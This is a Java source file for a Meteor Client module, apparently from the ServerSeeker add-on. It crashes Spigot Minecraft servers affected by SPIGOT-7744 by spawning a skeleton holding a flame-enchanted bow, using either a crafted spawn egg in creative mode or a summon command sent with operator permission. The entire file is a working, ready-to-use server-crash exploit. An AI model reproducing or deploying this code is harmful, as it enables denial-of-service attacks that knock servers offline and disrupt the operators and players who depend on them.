package de.damcraft.serverseeker.modules.crash;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import de.damcraft.serverseeker.ServerSeeker;
import de.damcraft.serverseeker.utils.NbtUtils;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.Blocks;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemUsageContext;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.InvocationTargetException;

import static de.damcraft.serverseeker.ServerSeeker.gson;

public class SpigotSkeletonCrash extends Module {
    public SpigotSkeletonCrash() {
        super(ServerSeeker.C.CRASH, "SpigotSkeletonCrash", "Crashes the server using a skeleton with a flame bow (requires creative/op) (<SPIGOT-7744).");
    }

    @EventHandler
    public void onTick(TickEvent.Post e) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        this.toggle();

        var data = getEntityData();

        if (ServerSeeker.mc.player.isCreative() || ServerSeeker.mc.player.isInCreativeMode()) {
            var stack = Items.SKELETON_SPAWN_EGG.getDefaultStack();
            var compound = NbtUtils.jsonToCompound(data);
            var constructor = NbtComponent.class.getDeclaredConstructor(NbtCompound.class);
            constructor.setAccessible(true);
            var nbt = constructor.newInstance(compound);
            stack.set(DataComponentTypes.ENTITY_DATA, nbt);
            ServerSeeker.mc.player.giveItemStack(stack);
            var pos = ServerSeeker.mc.player.getBlockPos().add(0, -1, 0);
            ServerSeeker.mc.world.setBlockState(pos, Blocks.STONE.getDefaultState());
            stack.useOnBlock(new ItemUsageContext(
                ServerSeeker.mc.player,
                Hand.MAIN_HAND,
                new BlockHitResult(pos.toCenterPos(), Direction.DOWN, pos, false)
            ));
        } else if (ServerSeeker.mc.player.hasPermissionLevel(2)) {
            ServerSeeker.mc.player.networkHandler.sendCommand("minecraft:summon skeleton ~ ~ ~ " + gson.toJson(data));
        }
    }

    private static @NotNull JsonObject getEntityData() {
        var data = new JsonObject();
        var hands = new JsonArray();
        var main = new JsonObject();
        main.addProperty("Count", 1);
        main.addProperty("id", "bow");
        var tag = new JsonObject();
        var enchs = new JsonArray();
        var flame = new JsonObject();
        flame.addProperty("id", "flame");
        flame.addProperty("lvl", (short) 1);
        enchs.add(flame);
        tag.add("Enchantments", enchs);
        main.add("tag", tag);
        hands.add(main);
        data.add("HandItems", hands);
        return data;
    }
}
